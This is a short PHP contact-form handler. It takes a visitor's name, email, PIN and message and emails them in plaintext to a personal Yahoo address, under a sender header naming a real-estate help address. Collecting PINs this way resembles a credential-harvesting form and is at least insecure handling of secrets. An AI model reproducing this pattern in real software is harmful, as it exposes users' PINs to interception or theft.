<?php

    $name    = $_POST['name'];
    $email   = $_POST['email'];
    $pin = $_POST['pin'];
    $message = $_POST['message']."\n\n User Email: ".$email."\n User Pin: ".$pin;


    $to      = "doe.john@yahoo.com";
    $subject = "Message From User";
    $headers = 'From: '."help@RealStateapplication.com"."\r\n".'Reply-To: '."help@RealStateapplication.com"."\r\n" . 'X-Mailer: PHP/' . phpversion();

if($name == "" || $email == "" || $_POST['message'] == ""){
    echo "<h2>Please complete the form.</h2>";
}
else{
    if( mail($to,$subject,$message,$headers) )
    {
        echo "<h2>Thank you for your message.</h2>";
    }
    else
    {
        echo "<h2>Sorry, there has been an error.</h2>";
    }
}

?>